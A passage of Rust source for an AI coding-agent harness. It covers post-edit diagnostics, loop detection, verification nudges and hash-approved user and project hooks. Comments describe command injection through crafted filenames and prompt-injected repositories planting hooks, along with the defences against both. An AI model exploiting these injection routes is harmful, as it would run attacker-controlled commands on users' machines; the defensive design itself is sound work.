//! Harness-side feedback that keeps agents honest without the user nagging:
//!
//! - diagnostics: after a batch of edits, typecheck/compile the touched project
//!   and hand errors *in the edited files* straight back to the agent
//! - loop detection: the same failing call over and over gets called out
//! - verification: an agent that edited code but never built/tested it is nudged once
//! - hooks: user commands that run before/after tools and at the run's edges

use super::shell;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use tokio_util::sync::CancellationToken;

// ───────────────────────────── diagnostics ─────────────────────────────

const DIAG_TIMEOUT_MS: u64 = 120_000;
const DIAG_MAX_LINES: usize = 40;

/// Walk up from `start` (inclusive) to `root` looking for `name`.
fn nearest(start: &Path, root: &Path, name: &str) -> Option<PathBuf> {
    let mut d = Some(start);
    while let Some(dir) = d {
        if dir.join(name).exists() {
            return Some(dir.to_path_buf());
        }
        if dir == root {
            break;
        }
        d = dir.parent();
    }
    None
}

/// One check to run: label, command, directory.
#[derive(Debug, PartialEq)]
pub struct Check {
    pub label: &'static str,
    pub cmd: String,
    pub dir: PathBuf,
}

/// Which checks cover these edited files (deduped per project root).
pub fn plan(cwd: &str, edited: &[PathBuf]) -> Vec<Check> {
    let root = Path::new(cwd);
    let mut out: Vec<Check> = vec![];
    let mut push = |c: Check| {
        if !out.iter().any(|x| x.cmd == c.cmd && x.dir == c.dir) {
            out.push(c);
        }
    };
    let mut py: Vec<String> = vec![];
    for f in edited {
        let ext = f
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let Some(dir) = f.parent() else { continue };
        match ext.as_str() {
            "ts" | "tsx" | "mts" | "cts" => {
                if let Some(d) = nearest(dir, root, "tsconfig.json") {
                    // Only if TypeScript is installed locally: never trigger a download.
                    let has_tsc = nearest(&d, root, "node_modules")
                        .is_some_and(|n| n.join("node_modules/typescript").exists());
                    if has_tsc {
                        push(Check {
                            label: "tsc",
                            cmd: "npx --no-install tsc --noEmit --pretty false".into(),
                            dir: d,
                        });
                    }
                }
            }
            "rs" => {
                if let Some(d) = nearest(dir, root, "Cargo.toml") {
                    push(Check {
                        label: "cargo check",
                        cmd: "cargo check --quiet --message-format short".into(),
                        dir: d,
                    });
                }
            }
            "go" => {
                if let Some(d) = nearest(dir, root, "go.mod") {
                    push(Check {
                        label: "go build",
                        cmd: "go build ./...".into(),
                        dir: d,
                    });
                }
            }
            "py" => py.push(f.to_string_lossy().replace('\\', "/")),
            _ => {}
        }
    }
    if !py.is_empty() {
        let files = py.iter().map(|p| quote(p)).collect::<Vec<_>>().join(" ");
        push(Check {
            label: "python syntax",
            cmd: format!("python -m py_compile {files}"),
            dir: root.to_path_buf(),
        });
    }
    out
}

/// Single-quote a path for the shell that `shell::run` picks.
///
/// The edited paths here are real filenames, which a repository fully controls:
/// `$`, a backtick and `;` are all legal in a Windows or POSIX filename, and a
/// double-quoted interpolation expands `$(…)` *inside* the quotes. That turned
/// "the agent edited a .py file" into arbitrary command execution with no
/// approval prompt, so a path never reaches a command line unescaped.
/// Inside single quotes neither POSIX shells nor PowerShell expand anything; a
/// literal `'` is closed, escaped and reopened, which is the standard idiom on
/// both.
pub fn quote(p: &str) -> String {
    format!("'{}'", p.replace('\'', r"'\''"))
}

/// Error lines that mention one of the edited files.
pub fn relevant(output: &str, edited: &[PathBuf]) -> Vec<String> {
    let names: Vec<String> = edited
        .iter()
        .filter_map(|p| {
            p.file_name()
                .map(|n| n.to_string_lossy().to_ascii_lowercase())
        })
        .collect();
    let mut out: Vec<String> = vec![];
    for l in output.lines() {
        let low = l.to_ascii_lowercase().replace('\\', "/");
        let is_err = low.contains("error")
            || low.contains("syntaxerror")
            || low.contains("cannot")
            || low.contains("undefined:");
        if is_err && names.iter().any(|n| low.contains(n.as_str())) && !out.iter().any(|x| x == l) {
            out.push(l.trim_end().chars().take(400).collect());
            if out.len() >= DIAG_MAX_LINES {
                out.push("… more errors cut".into());
                break;
            }
        }
    }
    out
}

/// Run the checks for these edits. Some(reminder) when edited files have errors.
pub async fn diagnose(cwd: &str, edited: &[PathBuf], cancel: &CancellationToken) -> Option<String> {
    let mut found: Vec<String> = vec![];
    for c in plan(cwd, edited) {
        let Ok(r) = shell::run(&c.cmd, &c.dir.to_string_lossy(), DIAG_TIMEOUT_MS, cancel).await
        else {
            continue;
        };
        if r.interrupted || r.timed_out || r.code == Some(0) {
            continue;
        }
        let lines = relevant(&r.output, edited);
        if !lines.is_empty() {
            found.push(format!("`{}` ({}):\n{}", c.cmd, c.label, lines.join("\n")));
        }
    }
    (!found.is_empty()).then(|| {
        format!(
            "<system-reminder>Automatic check after your edits found errors in files you just changed:\n\n{}\n\nFix these before moving on (errors elsewhere in the project were left out).</system-reminder>",
            found.join("\n\n")
        )
    })
}

// ───────────────────────────── loops + verification ─────────────────────────────

/// Consecutive identical failures before the agent is told it's looping.
pub const LOOP_AT: u32 = 5;

/// Tracks failing calls within one run.
#[derive(Default)]
pub struct LoopGuard {
    fails: HashMap<String, u32>,
}

impl LoopGuard {
    /// Record a result. Returns a reminder when the same call has now failed LOOP_AT times.
    pub fn record(&mut self, name: &str, input: &Value, is_err: bool) -> Option<String> {
        let key = format!("{name}:{input}");
        if !is_err {
            self.fails.remove(&key);
            return None;
        }
        let n = self.fails.entry(key).or_insert(0);
        *n += 1;
        (*n == LOOP_AT).then(|| {
            format!(
                "<system-reminder>You have made this exact `{name}` call {LOOP_AT} times and it failed every time. Repeating it won't help. Stop and change approach: re-read the error, check your assumptions (paths, file contents, syntax, what's installed), try a different tool or strategy, or ask the user if you're truly stuck.</system-reminder>"
            )
        })
    }
}

/// A bash command that builds, tests, lints or typechecks.
pub fn is_verify_command(cmd: &str) -> bool {
    let c = cmd.to_ascii_lowercase();
    const WORDS: &[&str] = &[
        "test", "build", "check", "lint", "tsc", "pytest", "vitest", "jest", "mocha", "cargo",
        "go vet", "go build", "mypy", "pyright", "ruff", "eslint", "clippy", "make", "gradle",
        "mvn", "dotnet", "npm run", "pnpm", "yarn", "bun run", "compile",
    ];
    WORDS.iter().any(|w| c.contains(w))
}

pub const VERIFY_NUDGE: &str = "<system-reminder>You changed code in this run but haven't built, tested or run anything to check it. Before you finish, verify the change the way this project does it (tests, build, typecheck, or actually running it) and fix what breaks. If verification truly isn't possible here, say so plainly in your final message instead of implying it works.</system-reminder>";

// ───────────────────────────── hooks ─────────────────────────────
//
// A hook is a shell command the user (or, since project hooks, a repository)
// registers against a point in the run. That makes this the one part of the
// harness that runs code *outside* the permission gate — a hook is not a tool
// call, so there is nobody to ask. The gate is therefore review-by-hash: a hook
// does not run until the user has approved the exact body that would run, and
// the approval is recorded against a hash of that body, so any later edit
// un-approves it (see `hook_hash` / `TrustedHook`). That is Codex's model, and
// it is the only thing that makes a repo-shipped hook safe: a prompt-injected
// repository can write `.openleash/hooks.json` all it likes, but it cannot write
// into the user's `settings.json`, so it cannot approve itself.

/// Every point the engine fires at, in the order the UI lists them.
///
/// The three original events bracket a tool call and the end of a run. The rest
/// are the moments those three cannot see: `session_start`/`session_end` bracket
/// the whole run rather than its last turn, `user_prompt_submit` is the only
/// place a hook can *refuse* what the user asked for before any model call,
/// `error` catches a run that died (a failed run never reaches `stop`), and
/// `subagent_stop` is the only event whose subject is a subagent rather than a
/// tool. `post_setup_worktree` is a different animal: it fires inside a worktree
/// that was just cut, to put back what git deliberately does not carry.
#[cfg(test)]
pub const EVENTS: &[&str] = &[
    "session_start",
    "user_prompt_submit",
    "pre_tool",
    "post_tool",
    "post_setup_worktree",
    "subagent_stop",
    "error",
    "stop",
    "session_end",
];

/// Whether `matcher` names a subject for this event: the tool name for pre/post,
/// the subagent id for `subagent_stop`. For every other event the field is
/// ignored, which is why the UI hides it there rather than pretending it applies.
pub fn event_has_matcher(event: &str) -> bool {
    matches!(event, "pre_tool" | "post_tool" | "subagent_stop")
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(default)]
pub struct Hook {
    /// One of `EVENTS`. A string rather than an enum so a settings.json written
    /// by a future build still loads here (and so an unknown event is a hook
    /// that never fires, not a file that fails to parse and loses every hook).
    pub event: String,
    /// Regex on the tool name (pre/post) or the subagent id (`subagent_stop`).
    /// Empty = every call. Ignored for events with no subject.
    pub matcher: String,
    pub command: String,
    pub enabled: bool,
    /// Stable identity, so an approval can be recorded against this hook and
    /// survive the list being reordered, re-saved or re-serialized. A
    /// settings.json written before this field existed has none, and one is
    /// assigned at load.
    #[serde(default)]
    pub id: String,
    /// Where the hook came from: "user" (the user's own settings file) or
    /// "project" (a `.openleash/hooks.json` inside the repository). Empty means
    /// user — a hook written before this field existed was, by construction, one
    /// the user typed.
    #[serde(default)]
    pub source: String,
    /// The project root a `source: "project"` hook was read from. Part of the
    /// trust key: two repositories may ship byte-identical hooks, and approving
    /// one must not approve the other.
    #[serde(default)]
    pub origin: String,
    /// `pre_tool` only: this hook may replace the tool call's arguments before it
    /// runs (Codex's `updatedInput`). Off unless the user ticks it, because it
    /// is the one hook power that turns "watch this call" into "decide what this
    /// call does", and it is therefore part of the approved hash.
    #[serde(default)]
    pub updated_input: bool,
    /// Reviewed and trusted *as it stands*, resolved against the approval list
    /// and this hook's current hash by `resolve_trust`.
    ///
    /// Derived state, and `serde(skip)`ed rather than merely defaulted: a
    /// `"trusted": true` in a JSON file must not be able to assert it, and the
    /// serialized `Hook` therefore carries no trust field at all. `hooks_status`
    /// (via `HookView`) is the one place it leaves the process. A repository that
    /// could set this would be approving itself, which is the whole hole the
    /// gate exists to close.
    #[serde(skip)]
    pub trusted: bool,
    /// The command as it was when it was approved, when that is no longer the
    /// current one. What the UI shows as "changed since you approved it". Also
    /// derived, and also never persisted: it is a function of the approval list.
    #[serde(skip)]
    pub changed_from: Option<String>,
}

impl Hook {
    /// The label the settings UI and `hooks_status` show for this hook.
    pub fn origin_of(&self) -> &str {
        if self.source.is_empty() {
            "user"
        } else {
            &self.source
        }
    }
}

/// Record an approval for a hook's *current* body, replacing any earlier one.
pub fn approve(h: &Hook, approved: &mut Vec<TrustedHook>) {
    let hash = hook_hash(h);
    approved.retain(|a| !(a.id == h.id && a.origin == h.origin));
    approved.push(TrustedHook {
        id: h.id.clone(),
        origin: h.origin.clone(),
        hash,
        command: h.command.clone(),
        approved_at: Some(Utc::now()),
    });
}

/// Withdraw an approval, so the hook stops running. Returns whether one was
/// there to withdraw.
pub fn revoke(id: &str, origin: &str, approved: &mut Vec<TrustedHook>) -> bool {
    let before = approved.len();
    approved.retain(|a| !(a.id == id && a.origin == origin));
    approved.len() != before
}

/// Bring a loaded `Settings` up to the trust gate without turning anything off.
///
/// This is the function that decides what an existing user's hooks do after the
/// upgrade, and the answer has to be "they keep running". Every hook in a
/// settings.json that predates this change was typed by the user into their own
/// file — the one file a repository cannot write — so it is grandfathered: an
/// approval is minted for it, exactly as if the user had pressed Trust, and it
/// fires as it always did. Silently stopping a hook somebody wrote and relies on
/// is the worst outcome available here, and a hook that quietly stopped firing
/// is the kind of failure nobody notices until it matters.
///
/// The grandfathering happens **once**, guarded by `hooks_trust_migrated`. That
/// guard is what makes the gate real for everything after: without it, a hook
/// added later would be auto-approved on the next launch, and an approval that
/// re-asserts itself is not a review. With it, a *new* hook — including one a
/// repository ships, and including one the user adds in Settings — starts
/// untrusted and stays that way until somebody presses Trust.
///
/// Ids are assigned here too, because an approval is keyed by one and a
/// settings.json written before `Hook::id` existed has none.
///
/// One deliberate widening, in the safe direction: `source` is **not** part of
/// the hash, so a hook loaded through a build that lacked the field and one
/// loaded here hash the same. Including it would un-trust every grandfathered
/// hook the first time this ran, which is the exact failure this function
/// exists to prevent. `updated_input` *is* part of the hash, and that is the
/// case that matters: gaining the power to rewrite a tool call after approval
/// is an escalation, so it re-arms the review.
///
/// The grandfathering's one blind spot, named: an install that had hooks and a
/// settings.json not yet written with `hooks_trust_migrated` is auto-approved on
/// first load, so a hook planted in that single upgrade window would ride in.
/// The window is narrow (it needs the app to have been running while the file
/// was written) and closing it costs every existing user their hooks, which is
/// the worse trade.
pub fn migrate_hooks(s: &mut super::store::Settings) {
    for (i, h) in s.hooks.iter_mut().enumerate() {
        if h.id.trim().is_empty() {
            // Deterministic, so two loads of the same file agree — a random id
            // here would mint a new approval on every launch.
            h.id = format!("hook-{i}");
        }
        if h.source.trim().is_empty() {
            h.source = "user".into();
        }
    }
    if !s.hooks_trust_migrated {
        s.hooks_trust_migrated = true;
        for h in &s.hooks {
            if approval_of(h, &s.trusted_hooks).is_none() {
                approve(h, &mut s.trusted_hooks);
            }
        }
    }
    resolve_trust(&mut s.hooks, &s.trusted_hooks);
}

/// An approval, recorded in the *user's* settings and keyed by the hash of the
/// body it approves.
///
/// It lives here and not in the hook's own file on purpose. `settings.json` is
/// the user's; a repository cannot reach it. So a project hook — or a hook body
/// swapped after the user read it — is untrusted until the user says otherwise
/// again, and the decision is recorded against exactly the bytes they looked at.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(default)]
pub struct TrustedHook {
    /// The `Hook::id` this approves, and the origin it belongs to. The origin is
    /// part of the key, not just the id: a repo that guessed an approved id
    /// still could not inherit its approval.
    pub id: String,
    pub origin: String,
    /// The hash that was approved. A mismatch means the hook changed, which
    /// un-trusts it until it is reviewed again.
    pub hash: String,
    /// The command as approved, so the UI can show what it changed *from*.
    pub command: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub approved_at: Option<DateTime<Utc>>,
}

/// What the user is actually approving: the event, matcher, command, and
/// whether the hook may rewrite arguments. Project hooks also include their
/// enabled state and effective timeout: a repo can edit `enabled`, and the
/// timeout is a security-relevant execution limit even though it is currently
/// shared and fixed.
///
/// Deliberately *not* the hook's `id`, `source` or `origin`:
///   * `id` is bookkeeping, and hashing it would un-trust a hook every time it
///     was re-saved under a fresh one — including the round trip through the
///     settings UI, which would make trust impossible to keep.
///   * `source`/`origin` are the *key*, not the body; the origin is already in
///     the lookup, and the source decides whether a hook is project-scoped at
///     all, so folding it in would only add churn.
/// `updated_input` *is* in, because flipping it on is an escalation: a hook that
/// could gain the power to rewrite a tool call after approval would have been
/// approved for something else. For project hooks, `enabled` and the current
/// timeout are in as well: changing a repo-controlled hook from disabled to
/// enabled, or changing the execution limit in a future build, re-arms review.
/// The legacy user-hook body stays byte-for-byte compatible with existing
/// approval hashes; their enabled switch is the user's own preference rather
/// than a repo-controlled capability change.
///
/// `event`, `matcher` and `command` are trimmed, because those are the fields a
/// text editor or the settings UI may round-trip with incidental whitespace, and
/// re-arming the review over a trailing newline trains the user to click
/// "Trust" without reading — which is worse than the gate.
pub fn hook_hash(h: &Hook) -> String {
    let legacy_user = h.source != "project";
    let canon = if legacy_user {
        // Keep pre-existing user approval records valid. `source` is forced by
        // the backend for newly saved hooks; an old empty source still means a
        // user-owned hook.
        format!(
            "{}\u{0}{}\u{0}{}\u{0}{}",
            h.event.trim(),
            h.matcher.trim(),
            h.command.trim(),
            if h.updated_input { "1" } else { "0" },
        )
    } else {
        format!(
            "{}\u{0}{}\u{0}{}\u{0}{}\u{0}{}\u{0}{}",
            h.event.trim(),
            h.matcher.trim(),
            h.command.trim(),
            if h.updated_input { "1" } else { "0" },
            if h.enabled { "1" } else { "0" },
            HOOK_TIMEOUT_MS,
        )
    };
    let mut d = Sha256::new();
    d.update(canon.as_bytes());
    format!("{:x}", d.finalize())
}

/// Stamp `trusted` / `changed_from` on every hook, from the approval list.
///
/// Idempotent, and called from every path that creates or mutates a `Settings`.
/// It has to be, and that is not a style point: the resolved flag is what
/// `hook_runs` gates on, so a hook whose trust was never resolved reads as
/// untrusted and silently stops firing. For a *user* hook that is the worst
/// outcome in this file — the user wrote it, it has been running for a year, and
/// after an upgrade it just... doesn't. The grandparents in `load_settings` and
/// the re-resolve after every write are what keep that from happening.
pub fn resolve_trust(hooks: &mut [Hook], approved: &[TrustedHook]) {
    for h in hooks.iter_mut() {
        let hash = hook_hash(h);
        if h.source.is_empty() {
            h.source = "user".into();
        }
        match approved
            .iter()
            .find(|a| a.id == h.id && a.origin == h.origin)
        {
            Some(a) if a.hash == hash => {
                h.trusted = true;
                h.changed_from = None;
            }
            Some(a) => {
                h.trusted = false;
                h.changed_from = Some(a.command.clone());
            }
            None => {
                h.trusted = false;
                h.changed_from = None;
            }
        }
    }
}

/// An approval for one hook, or `None` if it has never been reviewed.
pub fn approval_of<'a>(h: &Hook, approved: &'a [TrustedHook]) -> Option<&'a TrustedHook> {
    approved
        .iter()
        .find(|a| a.id == h.id && a.origin == h.origin)
}

/// One hook as the settings UI sees it: the hook plus the trust verdict, so the
/// UI never has to recompute a hash (and cannot get it wrong).
#[derive(Debug, Clone, Serialize)]
pub struct HookView {
    #[serde(flatten)]
    pub hook: Hook,
    pub trusted: bool,
    /// Approved once, changed since. Distinct from "never reviewed" because the
    /// two need different words: one is "you approved something else", the other
    /// is "you have not looked at this".
    pub stale: bool,
    pub changed_from: Option<String>,
    /// false for a project hook: it lives in the repository, so it is edited
    /// there. The settings UI shows those read-only rather than offering a box
    /// that cannot be saved.
    pub can_edit: bool,
}

impl HookView {
    pub fn of(h: &Hook) -> Self {
        let stale = !h.trusted && h.changed_from.is_some();
        Self {
            trusted: h.trusted,
            stale,
            changed_from: h.changed_from.clone(),
            can_edit: h.origin_of() == "user",
            hook: h.clone(),
        }
    }
}

/// Every hook in force for a project: the user's own, then the project's.
///
/// This is the one place the two sources meet, and it is a function rather than
/// a field because "which hooks apply" depends on the task's project, which
/// `Settings` does not know. The turn loop reads it instead of `settings.hooks`.
///
/// The project's hooks are appended rather than merged: a repository cannot
/// shadow, replace or disable a hook the user wrote, only add its own — which
/// then have to be approved on their own merits.
pub fn hooks_for(s: &super::store::Settings, project: &str) -> Vec<Hook> {
    let mut out = s.hooks.clone();
    // Project hooks require both trust layers: the folder trust prevents an
    // unopened repository from injecting any instructions or capabilities, and
    // hook hash trust separately requires the user to approve each command body.
    if super::trust::trusted(&s.trust, project) {
        out.extend(project_hooks(project, &s.trusted_hooks));
    }
    out
}

/// The project's hooks, from `.openleash/hooks.json`, with trust resolved
/// against the *user's* approvals.
///
/// A missing, unreadable or malformed file is not an error the caller has to
/// handle: a repository that ships no hooks and one that ships a broken file
/// both contribute nothing, and neither should be able to stop a run.
pub fn project_hooks(project: &str, approved: &[TrustedHook]) -> Vec<Hook> {
    let mut out = project_hooks_at(project);
    resolve_trust(&mut out, approved);
    out
}

/// Where a project's hooks live.
pub fn project_hooks_path(project: &str) -> Option<PathBuf> {
    (!project.trim().is_empty()).then(|| Path::new(project).join(".openleash").join("hooks.json"))
}

/// What a repository may say about a hook — and what it may not.
///
/// There is no `trusted`, no `source` and no `origin` here, and that absence is
/// the security property: `trusted` and `source` are `#[serde(deny_unknown_fields)]`-
/// free on `Hook`, so parsing a repo's file straight into a `Hook` would let it
/// write `"trusted": true` and wave itself through. A file can only describe a
/// command; the right to run it is the user's.
#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
struct ProjectHookEntry {
    event: String,
    matcher: String,
    command: String,
    /// A project hook is opt-*out*, unlike a `Hook` literal: a repository that
    /// ships `{"event": "post_tool", "command": "cargo fmt"}` means it, and
    /// making that default to off would leave every project hook silently dead
    /// with no way to tell why.
    #[serde(default = "yes")]
    enabled: bool,
    updated_input: bool,
    id: String,
}

impl Default for ProjectHookEntry {
    fn default() -> Self {
        Self {
            event: String::new(),
            matcher: String::new(),
            command: String::new(),
            enabled: true,
            updated_input: false,
            id: String::new(),
        }
    }
}

fn yes() -> bool {
    true
}

/// Read and parse a project's hook file. Split from `project_hooks` so the
/// parsing (which a repo controls) and the trust resolution (which it must not)
/// are visibly different steps.
fn project_hooks_at(project: &str) -> Vec<Hook> {
    let Some(path) = project_hooks_path(project) else {
        return vec![];
    };
    let Ok(text) = std::fs::read_to_string(&path) else {
        return vec![];
    };
    // Two shapes, both accepted: a bare array, and `{"hooks": [...]}`. The
    // second is what a reader expects from a file named after the setting, and
    // costs one branch to support.
    let entries: Vec<ProjectHookEntry> = match serde_json::from_str::<Value>(&text) {
        Ok(Value::Array(a)) => a
            .into_iter()
            .filter_map(|v| serde_json::from_value(v).ok())
            .collect(),
        Ok(v) => v
            .get("hooks")
            .and_then(|h| serde_json::from_value(h.clone()).ok())
            .unwrap_or_default(),
        Err(_) => return vec![],
    };
    let origin = project.trim().to_string();
    entries
        .into_iter()
        .enumerate()
        .filter(|(_, e)| !e.command.trim().is_empty())
        .map(|(i, e)| Hook {
            // An id from the file is honoured (so a repository can keep an
            // approval across a reorder) but namespaced, so a project hook can
            // never collide with — and therefore never inherit the approval of
            // — a user hook that happens to share the name.
            id: if e.id.trim().is_empty() {
                format!("project:{i}")
            } else {
                format!("project:{}", e.id.trim())
            },
            event: e.event.trim().to_string(),
            matcher: e.matcher.trim().to_string(),
            command: e.command,
            enabled: e.enabled,
            // forced, never read from the file
            source: "project".into(),
            origin: origin.clone(),
            updated_input: e.updated_input,
            // Resolved by the caller against the *user's* list.
            trusted: false,
            changed_from: None,
        })
        .collect()
}

/// How long a hook may run.
pub const HOOK_TIMEOUT_MS: u64 = 60_000;

/// Most of a hook's output that may be spent on the model's context, in
/// characters. Codex caps injected hook context at ~2500 tokens; English lands
/// near four characters per token, so 10k characters is about that cap.
pub const HOOK_INJECT_CAP: usize = 10_000;

/// Whether this hook should fire for this `(event, subject)`: enabled, matching,
/// its body non-empty, and — the part that is a security property rather than a
/// feature — trusted against the hash the user approved.
pub fn hook_runs(h: &Hook, event: &str, tool: &str) -> bool {
    h.trusted && hook_matches(h, event, tool)
}

pub fn hook_matches(h: &Hook, event: &str, tool: &str) -> bool {
    h.enabled
        && h.event == event
        && !h.command.trim().is_empty()
        && (h.matcher.trim().is_empty()
            || !event_has_matcher(event)
            || regex::Regex::new(&format!("^(?:{})$", h.matcher.trim()))
                .is_ok_and(|r| r.is_match(tool)))
}

#[derive(Debug, Clone)]
pub struct HookOut {
    pub command: String,
    pub ok: bool,
    pub output: String,
    /// `updated_input` was ticked on this hook (checked against the parse below).
    pub updated_input: bool,
    /// The hook printed a JSON object. Two spellings are read out of it — see
    /// `read_hook_json` — for the requests a hook can make beyond its exit code.
    pub json: Option<Value>,
}

impl HookOut {
    /// The reason a `pre_tool` hook refused the call, if it did.
    ///
    /// Two ways to refuse, both honoured: the Unix way (non-zero exit) and an
    /// explicit `{"decision": "block"}` / `{"permissionDecision": "deny"}`, which
    /// lets a hook that already exited 0 still say no and explain itself.
    pub fn refusal(&self) -> Option<String> {
        if let Some(j) = self.json.as_ref() {
            let decision = j.get("decision").and_then(Value::as_str);
            let permission_decision = j
                .get("hookSpecificOutput")
                .and_then(|h| h.get("permissionDecision"))
                .and_then(Value::as_str);
            let blocked = matches!(decision, Some("block" | "deny"))
                || matches!(permission_decision, Some("block" | "deny"));
            if blocked {
                let reason = j
                    .get("reason")
                    .and_then(Value::as_str)
                    .or_else(|| {
                        j.get("hookSpecificOutput")
                            .and_then(|h| h.get("permissionDecisionReason"))
                            .and_then(Value::as_str)
                    })
                    .filter(|r| !r.trim().is_empty());
                return Some(
                    reason
                        .unwrap_or("Hook explicitly refused this operation.")
                        .to_string(),
                );
            }
        }
        (!self.ok).then(|| {
            if self.output.trim().is_empty() {
                "Hook failed with a non-zero exit status.".to_string()
            } else {
                self.output.clone()
            }
        })
    }

    /// The arguments this hook wants the call to run with instead, if any.
    ///
    /// `updatedInput` replaces the whole argument object (Codex's semantics), it
    /// is only read from a hook the user ticked `updated_input` on, and only a
    /// trusted hook is ever run at all — so this cannot be reached by a hook
    /// that was approved without the power.
    pub fn updated_input(&self) -> Option<Value> {
        if !self.updated_input {
            return None;
        }
        let j = self.json.as_ref()?;
        j.get("updatedInput")
            .or_else(|| j.get("hookSpecificOutput")?.get("updatedInput"))
            .filter(|v| v.is_object())
            .cloned()
    }
}

/// Read a hook's requests out of its stdout.
///
/// Only a *pure* JSON object counts. A hook that prints a log line before the
/// object, or prints its normal output, is read as making no request — the
/// alternative (scanning for the first `{`) would let an unrelated line of
/// output change a tool call, which is exactly the kind of quiet surprise the
/// rest of this file exists to prevent.
fn read_hook_json(out: &str) -> Option<Value> {
    serde_json::from_str::<Value>(out.trim())
        .ok()
        .filter(|v| v.is_object())
}

/// What a `pre_tool` hook decided about one call.
pub struct PreTool {
    /// The hook that refused it, and why (`None` = the call may run).
    pub blocked: Option<HookOut>,
    /// Arguments to run the call with instead, when a trusted hook with the
    /// `updated_input` power asked for them.
    pub updated_input: Option<Value>,
}

/// Run every matching, trusted hook for one event.
///
/// Hooks get the call through env vars: `OL_EVENT`, `OL_TOOL`, `OL_INPUT`
/// (JSON), `OL_OUTPUT`, `OL_CWD`, `OL_PROJECT`, `OL_TASK`, plus whatever the
/// event's own wrapper adds (`OL_PROMPT`, `OL_REPORT`, `OL_ROOT`, …).
#[cfg(test)]
pub async fn run_hooks(
    hooks: &[Hook],
    event: &str,
    tool: &str,
    input: &Value,
    output: &str,
    cwd: &str,
    task: &str,
    cancel: &CancellationToken,
) -> Vec<HookOut> {
    fire(
        hooks,
        event,
        tool,
        input,
        output,
        &[],
        cwd,
        cwd,
        task,
        cancel,
    )
    .await
}

#[allow(clippy::too_many_arguments)]
async fn fire(
    hooks: &[Hook],
    event: &str,
    tool: &str,
    input: &Value,
    output: &str,
    extra: &[(&str, String)],
    cwd: &str,
    project: &str,
    task: &str,
    cancel: &CancellationToken,
) -> Vec<HookOut> {
    let mut res = vec![];
    for h in hooks.iter().filter(|h| hook_runs(h, event, tool)) {
        let inp: String = input.to_string().chars().take(50_000).collect();
        let outp: String = output.chars().take(50_000).collect();
        let mut env = vec![
            ("OL_EVENT", event.to_string()),
            ("OL_TOOL", tool.to_string()),
            ("OL_INPUT", inp),
            ("OL_OUTPUT", outp),
            ("OL_CWD", cwd.to_string()),
            ("OL_PROJECT", project.to_string()),
            ("OL_TASK", task.to_string()),
        ];
        env.extend(extra.iter().map(|(k, v)| (*k, v.clone())));
        match shell::run_env(&h.command, cwd, &env, HOOK_TIMEOUT_MS, cancel).await {
            Ok(r) => {
                // `r.output` is already `truncate_output`'d (30k, head+tail, whole
                // copy spilled to disk). The request JSON is read from *that*, so
                // a hook that wants to make a request must print a small pure JSON
                // object and nothing else: a blob over the cap would be cut and
                // `read_hook_json` would decline to guess. That is deliberate — the
                // alternative (scanning for the first `{`) would let an unrelated
                // line of output change a tool call.
                let raw = r.output.trim();
                res.push(HookOut {
                    command: h.command.clone(),
                    ok: r.code == Some(0) && !r.timed_out,
                    output: cap_injected(raw),
                    updated_input: h.updated_input,
                    json: read_hook_json(raw),
                })
            }
            Err(e) => res.push(HookOut {
                command: h.command.clone(),
                ok: false,
                output: e,
                updated_input: h.updated_input,
                json: None,
            }),
        }
    }
    res
}

/// Cap what a hook may add to the model's context, keeping the whole output on
/// disk.
///
/// A hook that dumps a file, or a whole test log, would otherwise spend the
/// context window on something the model can read on demand — and the failure
/// is worse than for a command, because a hook's output is injected
/// unconditionally, into every call it matches. So: head, tail, the path of the
/// full copy, and a count of what was dropped.
pub fn cap_injected(s: &str) -> String {
    let s = s.trim();
    let n = s.chars().count();
    if n <= HOOK_INJECT_CAP {
        return s.to_string();
    }
    let keep = HOOK_INJECT_CAP / 3;
    let head: String = s.chars().take(keep).collect();
    let tail: String = s.chars().skip(n - keep).collect();
    let saved = spill_text(s)
        .map(|p| {
            format!(
                " Full output saved to {} — read_file it instead of printing it again.",
                p.display()
            )
        })
        .unwrap_or_default();
    format!(
        "{head}\n\n… [{} characters truncated.{saved}] …\n\n{tail}",
        n - 2 * keep
    )
}

/// Keep the whole of a spilled hook output on disk (newest 50 kept).
///
/// Shares `shell::truncate_output`'s directory — one place the user can look —
/// and prefixes the name so the two writers can never collide on one.
fn spill_text(s: &str) -> Option<PathBuf> {
    let dir = super::store::data_dir().join("spill");
    std::fs::create_dir_all(&dir).ok()?;
    let p = dir.join(format!(
        "hook-{}-{}.txt",
        chrono::Local::now().format("%Y%m%d-%H%M%S"),
        super::new_id()
    ));
    std::fs::write(&p, s).ok()?;
    if let Ok(rd) = std::fs::read_dir(&dir) {
        let mut files: Vec<_> = rd.flatten().map(|e| e.path()).collect();
        if files.len() > 50 {
            files.sort();
            for f in &files[..files.len() - 50] {
                let _ = std::fs::remove_file(f);
            }
        }
    }
    Some(p)
}

// ── one entry point per event ──
//
// The turn loop calls these rather than reaching for `run_hooks` directly, so
// the set of variables each event defines lives next to the event's meaning.
// Each is a thin, testable wrapper: the engine (fire, trust, capping) is shared.

/// A run has begun. Fires once, in the chat's folder, before the first request.
pub async fn session_start(
    hooks: &[Hook],
    cwd: &str,
    project: &str,
    task: &str,
    cancel: &CancellationToken,
) -> Vec<HookOut> {
    fire(
        hooks,
        "session_start",
        "",
        &Value::Null,
        "",
        &[],
        cwd,
        project,
        task,
        cancel,
    )
    .await
}

/// A run has ended — whatever the outcome. `summary` is the agent's last words,
/// so a hook can log or archive them.
pub async fn session_end(
    hooks: &[Hook],
    summary: &str,
    cwd: &str,
    project: &str,
    task: &str,
    cancel: &CancellationToken,
) -> Vec<HookOut> {
    fire(
        hooks,
        "session_end",
        "",
        &Value::Null,
        summary,
        &[],
        cwd,
        project,
        task,
        cancel,
    )
    .await
}

/// The user sent a message. A refusal stops it before any model call, which is
/// the point: this is the only hook that can act on what the user asked for
/// before it costs anything.
///
/// Returns the refusal to show, or `None` to let the message through.
pub async fn user_prompt_submit(
    hooks: &[Hook],
    prompt: &str,
    cwd: &str,
    project: &str,
    task: &str,
    cancel: &CancellationToken,
) -> Option<String> {
    let extra = [("OL_PROMPT", prompt.to_string())];
    let outs = fire(
        hooks,
        "user_prompt_submit",
        "",
        &Value::Null,
        "",
